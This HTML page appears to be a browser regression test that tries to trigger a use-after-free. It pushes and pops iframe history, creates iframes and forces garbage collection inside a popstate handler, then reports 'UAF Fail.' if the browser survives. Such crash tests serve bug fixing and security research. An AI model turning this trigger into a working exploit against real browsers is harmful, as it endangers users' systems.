<!DOCTYPE html>
<html>
<head>
<script>

function gc() {
    function gcRec(n) {
        if (n < 1)
            return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);  
}

function step1() {
    const childA = document.getElementById('childA').contentWindow;
    childA.addEventListener('popstate', () => {
        for (let i = 0; i < 40; i++) {
            const f = document.createElement('iframe');
            f.src = 'about:blank';
            document.body.appendChild(f);
        }
        gc();
    }, { once: true });

    childA.history.pushState({k: 1}, '', '#x');

    setTimeout(step2, 0);
}

function step2() {
    history.back();
    setTimeout(() => {
        document.getElementById('result').textContent = 'UAF Fail.';
        if (window.testRunner)
            testRunner.notifyDone();
    }, 1000);
}

window.onload = () => {
    setTimeout(step1, 0);
};
</script>
</head>
<body>
<p id="result"></p>
<iframe id="childA" src="dummy.html"></iframe>
<iframe id="childB" src="dummy.html"></iframe>
</body>
</html>
